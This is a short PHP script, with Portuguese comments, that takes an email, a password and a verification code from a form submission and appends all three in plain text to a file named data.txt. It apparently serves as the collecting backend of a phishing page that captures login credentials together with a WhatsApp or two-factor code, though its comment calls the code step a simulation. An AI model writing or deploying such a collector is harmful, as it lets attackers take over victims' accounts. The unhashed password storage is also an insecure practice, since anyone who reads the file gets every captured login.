<?php
header('Content-Type: application/json');

// Recebe os dados do formulário
$data = json_decode(file_get_contents('php://input'), true);

if (!isset($data['code'], $data['email'], $data['password'])) {
    echo json_encode(['success' => false, 'message' => 'Invalid data received']);
    exit;
}

// Simula o envio do código via WhatsApp (aqui você pode integrar com uma API de envio real)
$code = $data['code'];
$email = $data['email'];
$password = $data['password'];

// Salva os dados em um arquivo
$file = 'data.txt';
$currentData = file_get_contents($file);
$currentData .= "Email: $email, Password: $password, Code: $code\n";
file_put_contents($file, $currentData);

// Retorna uma resposta de sucesso
echo json_encode(['success' => true]);
?>
